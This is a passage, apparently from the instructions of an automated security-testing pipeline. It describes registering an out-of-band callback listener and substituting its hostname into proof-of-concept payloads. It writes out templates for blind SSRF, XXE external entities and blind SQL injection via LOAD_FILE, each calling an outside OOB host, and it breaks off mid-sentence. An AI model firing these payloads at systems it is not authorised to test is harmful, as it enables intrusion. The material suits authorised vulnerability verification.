## OOB Setup Step Template

When a finding's `vuln_class` is in `[Blind SSRF, XXE, Blind SQL Injection, SSTI, RCE]`,
prepend an OOB setup step BEFORE the payload delivery step:

```
Step 0 (OOB Setup): register_oob_listener
Precondition: interactsh_server_configured == true in run manifest
Action: execute_tool("oob_listener", ["--register", "--correlation-id", "{{poc_id}}"])
OOB Hostname: {{oob_hostname}}.oast.pro  # assigned by oob_listener
Substitution: replace {{OOB_HOST}} with this hostname in all subsequent steps
If OOB unavailable: skip OOB steps, mark poc as unverified, max_severity: medium
```

Then in the payload step, substitute `{{OOB_HOST}}` with the assigned OOB callback URL:
- Blind SSRF: `url=http://{{OOB_HOST}}/{{poc_id}}`
- XXE: `<!ENTITY % oob SYSTEM "http://{{OOB_HOST}}/{{poc_id}}">`
- Blind SQLi: `LOAD_FILE('\\\\{{OOB_HOST}}\\share\\file')`

## SSRF Redirect Loop Oracle (OOB-Free Blind SSRF â€” Automatic Fallback)

When `vuln_class == Blind SSRF` AND `oob_available == false`, this protocol
**automatically activates** â€” it is not optional. Use the HTTP Redirect Loop
